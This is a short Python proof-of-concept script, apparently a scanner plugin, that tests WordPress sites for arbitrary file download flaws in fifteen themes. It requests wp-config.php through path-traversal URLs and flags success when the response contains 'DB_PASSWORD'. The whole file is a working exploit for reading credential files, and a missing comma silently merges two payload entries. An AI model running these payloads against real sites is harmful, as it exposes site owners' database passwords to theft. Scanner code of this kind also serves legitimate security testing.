#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:range
#refer:http://packetstormsecurity.com/files/129706/wptheme-download.txt
#refer:http://www.beebeeto.com/pdb/poc-2014-0222/

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    paylaod_list = [
    '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
    '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
    '/wp-content/themes/markant/download.php?file=../../wp-config.php',
    '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
    '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
    '/wp-content/themes/felis/download.php?file=../wp-config.php',
    '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
    '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php'
    '/wp-content/themes/epic/includes/download.php?file=wp-config.php',
    '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
    '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
    '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
    '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php'
    ]
    for paylaod in paylaod_list:
        url = arg + paylaod
        code, head, res, errcode, _ = curl.curl(url)
        if code == '200' and res.find('DB_PASSWORD') != -1:
            sercurity_hole(url + ' Arbitrary File Download')

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
